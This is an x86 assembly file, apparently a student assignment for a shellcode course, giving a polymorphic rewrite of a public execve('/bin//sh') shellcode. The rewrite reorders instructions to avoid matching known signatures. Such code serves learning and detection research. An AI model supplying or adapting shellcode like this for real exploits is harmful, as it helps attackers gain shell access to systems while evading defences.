;#SLAE Assignment #06: Polymorphism
;#Polymorphic Version of hellcode from: http://shell-storm.org/shellcode/files/shellcode-517.php
;#AUTHOR: SLAE-1262

section .text
global _start

_start: ;Polymorphic Version:   
	mov eax,ecx	;for cross-xor
	xor ecx,eax	;eax=ecx=0
	push ecx	;0-dword
	mov dword [esp-8],0x6e69622f	;"nib/"
	mov dword [esp-4],0x68732f2f	;"hs//"
	sub esp,8	;align esp	
	mov ebx,esp	;stringpointer
	add al, 0xb	;11-> execve
	int 0x80	;call syscall
